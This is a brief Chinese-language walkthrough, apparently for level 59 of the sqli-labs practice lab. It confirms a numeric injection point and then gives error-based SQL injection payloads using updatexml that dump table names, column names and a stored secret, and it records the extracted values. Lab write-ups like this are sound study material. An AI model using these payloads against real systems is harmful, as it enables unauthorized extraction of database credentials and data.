---
title: less59
url: https://www.yuque.com/u29002979/ep2zrx/ft8f4rxercwgdazg
---

```bash
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";
```

闭合方式数字型

`?id=1 and 1=1--+`
`?id=1 and 1=2--+` <a name="OK6A0"></a>

# 报错注入

```bash
爆破数据表
?id=-1 and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +
数据表：codgf1m6wa

爆破字段名
?id=-1 and updatexml(1,concat(0x7e,(select  group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='codgf1m6wa'),0x7e),1) -- +
字段：secret_JGAS

获取密码
?id=-1 and updatexml(1,concat(0x7e,(select secret_JGAS from codgf1m6wa),0x7e),1) -- +
密码：JvKSBvmuHkWi8od1IZnHs94e
```
